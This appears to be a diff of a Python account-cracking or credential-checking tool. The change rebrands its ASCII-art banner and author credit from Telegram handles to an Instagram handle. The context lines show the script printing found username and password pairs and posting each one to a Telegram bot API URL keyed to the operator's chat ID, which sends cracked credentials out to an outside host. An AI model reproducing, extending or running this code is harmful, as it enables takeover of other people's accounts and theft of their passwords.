@@ -14,7 +14,7 @@ else:
  | |  | |/ _ \ \ /\ / /
  | |__| |  __/\ V  V / 
  |_____/ \___| \_/\_/  
-    Tele : @DewTools | @LordAbdulla                
+    Insta : @hr8k                
                       """
 )
     Dady = input(' Enter Your ID : ')
@@ -80,6 +80,5 @@ else:
             print(f" Secured Account :( {user}:{pasw} ")
             requests.post(f"https://api.telegram.org/bot{tk}/sendMessage?chat_id={Dady}&text=  Secure Hit:(!  \n  UserName : {user} \n  Password : {pasw} \n  - Our Channel : @DewTools ")
 
-#Telegram : @DewTools
 #Inst : @LordAbdulla
 #Github : github.com/LordAbdulla
